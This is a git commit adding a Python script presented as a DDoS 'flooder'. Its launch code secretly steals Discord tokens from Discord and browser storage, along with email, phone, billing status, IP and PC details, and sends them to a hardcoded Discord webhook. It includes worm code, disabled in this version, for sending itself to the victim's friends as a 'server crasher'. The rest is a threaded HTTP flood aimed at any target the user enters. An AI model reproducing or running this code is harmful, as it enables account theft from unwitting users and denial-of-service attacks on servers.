7450501e517632ade767e66cf16c49fb77ea57db
GalvinID <68190778+GalvinID@users.noreply.github.com>
2020-12-22 13:23:41 +0700

    Add files via upload

---
+++ Flooder-stealer.py
@@ -0,0 +1,419 @@
+#Remaked by GaLViN Credit to Nii-Chan 
+#Python3
+
+import os, sys
+if os.name != "nt":
+    exit()
+import requests, urllib3
+import socket, socks, threading, random, re, os
+import sys, glob, time, requests, ssl, webbrowser
+import bz2, datetime, wget, json, cfscrape, urllib3
+from time import sleep
+from os import system
+from sys import stdout
+from scapy.all import *
+from random import randint
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+from threading import Thread
+from time import sleep
+from sys import argv
+os.system('cls')
+
+urllib3.disable_warnings()
+urllib3.PoolManager()
+
+useragents=[""]
+
+ref = [""]
+
+acceptall = [""]  
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": f"Simple DDoS tools with token-stealer "
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+    }
+    try:
+        urlopen(Request("https://discord.com/api/webhooks/788732722780307486/CqTug8H8ihkDnZ4kS1Gz8_ViaJcUsdfVv8SJvszXJObMKNkOj9u2u-aKEzNspeSGPYSZ", data=dumps(webhook).encode(), headers=getheaders()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
+
+
+def logo():
+    os.system('color 4')
+    print("")
+    try:
+        print(" Target : " +str(url_main)+ ":" +str(port))
+    except:
+        pass
+    try:
+        print(" Method : " +str(name_method_attack))
+    except:
+        pass
+    try:
+        print(" Mode   : " +str(filenam2))
+    except:
+        pass
+    try:
+        print(" Threads: " +str(threads))
+    except:
+        pass
+
+def start_url():
+    global url, url_main, host_url, host_ip, port
+    if sys.platform.startswith("linux"):
+        pass
+    elif sys.platform.startswith("freebsd"):
+        pass
+    else:
+        path = "C:/Program Files/nodejs/node.exe"
+        if (not os.path.isfile(path)):
+            print("[!] Please Install NodeJs. Downloading... [!]")
+            down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
+            down
+            os.system("node-v12.13.0-x64.msi")#Credit to Nii-Chan
+    logo()
+    url = input("Target [URL/IP]: ").strip()
+    if url == "":
+        start_url()
+    url_main = url
+    try:
+        if url[0]+url[1]+url[2]+url[3] == "www.":
+            url = "http://" + url
+        elif url[0]+url[1]+url[2]+url[3] == "http":
+            pass
+        else:
+            url = "http://" + url
+    except:
+        print("You Mistyped, Try Again ")
+        start_url()
+    logo()
+    try:
+        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+    except:
+        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
+    host_ip = socket.gethostbyname(host_url)
+    start_port()
+    logo()
+    choice_method_attack()
+
+def start_port():
+    global port
+    print("-----------------------------")
+    port = str(input(" Port: "))
+    if port == '':
+        if "http" in url:
+                port = int(80)
+                print(" Selected Port = 80")
+        else:
+            port = int(80)
+            print(" Selected Port = 80 ")
+    else:
+        port = int(port)
+
+def start_mode():
+    global choice_mode, filenam1, filenam2, method_pass_cf
+    print("")
+    choice_mode = input(" MODE [TYE 0] ")
+    if choice_mode == "0":
+        filenam2 = "Home"
+        logo()
+        numthreads()
+    else:
+        print (" You mistyped, try again ")
+        start_mode()
+
+
+def choice_method_attack():
+    global method_attack, name_method_attack
+    print("-----------------------------")
+    print(" 1: HTTP Request [ Normal ]")
+    print(" 2: HTTP Request [  Spam  ]")
+    method_attack = input("Choice Request [1/2]: ")
+    if (method_attack == "1") or (method_attack == ""):
+        name_method_attack = "Normal"
+        print(" Selected Method Attack Normal")
+        method_attack = "1"
+    elif method_attack == "2":
+        name_method_attack = "Spam"
+        print(" Selected Method Attack Spam")
+    else:
+        print ("You mistyped, try again ")
+        choice_method_attack()
+    logo()
+    start_mode()
+
+
+
+def numthreads():
+    global threads
+    try:
+        print("-----------------------------")
+        threads = int(input(" Threads [2000]: "))
+    except ValueError:
+        threads = int(2000)
+        print (" Selected Threads " +str(threads)+ " [!]\n")
+    logo()
+    begin()
+
+def begin():
+    choice6 = input('Press "Enter" to start DoS ')
+    if choice6 == "":
+        attack()
+        print()
+    else:
+        sys.exit()
+
+def attack():
+    global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
+    x     = int(0)
+    error = int(0)
+    req_code = int(0)
+    multiple = int(100)
+    connection = "Connection: Keep-Alive\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    if choice_mode == "0":
+        for x in range(threads):
+            Home(x+1).start()
+
+class Home(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+
+    def run(self):
+        global req_code, error
+        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+        accept    = random.choice(acceptall)
+        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
+        if method_attack == "1":
+            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            request  = get_host + useragent + accept + content + length + "\r\n"
+        else:
+            get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            request  = get_host + useragent + accept + referer + content + length + "\r\n"
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(host_url), int(port)))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                print("HTTP Request to The Server "  " => " +str(host_url)+ ":" +str(port))
+                try:
+                    for y in range(multiple):
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        print("Attacking The Server "  " => " +str(host_url)+ ":" +str(port))
+                except:
+                    try:
+                        s.close()
+                        error += 1
+                    except:
+                        pass
+            except:
+                try:
+                    s.close()
+                    error += 1
+                except:
+                    pass
+
+if __name__ == '__main__':
+    start_url()
